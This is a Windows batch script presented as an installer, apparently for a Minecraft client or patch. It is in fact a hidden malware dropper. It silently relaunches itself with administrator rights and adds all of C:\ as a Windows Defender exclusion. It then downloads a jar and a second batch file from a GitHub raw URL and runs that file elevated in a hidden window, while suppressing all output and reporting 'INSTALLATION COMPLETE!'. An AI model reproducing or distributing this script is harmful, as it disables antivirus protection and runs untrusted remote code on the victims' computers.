@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && powershell.exe Start-Process '"%~dpnx0"' -Verb "runas" -WindowStyle Hidden >nul 2>&1 %* && exit
IF '%PROCESSOR_ARCHITECTURE%' EQU 'amd64' (
  "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
  "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
cls
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
   exit
) else ( goto gotAdmin )
:gotAdmin
   pushd "%CD%"
   CD /D "%~dp0"
cls
powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/vtap-client.jar'; $dest = './vtap-client.jar'; Invoke-WebRequest -Uri $url -OutFile $dest" >nul 2>&1
powershell.exe Add-MpPreference -ExclusionPath "C:\\" -Force >nul 2>&1
powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/minecraft-patch'; $dest = '%APPDATA%\Patcher.bat'; Invoke-WebRequest -Uri $url -OutFile $dest" >nul 2>&1
powershell.exe Start-Process '"%APPDATA%\Patcher.bat"' -Verb "runas" -WindowStyle Hidden >nul 2>&1
echo INSTALLATION COMPLETE! > RESULT.log
exit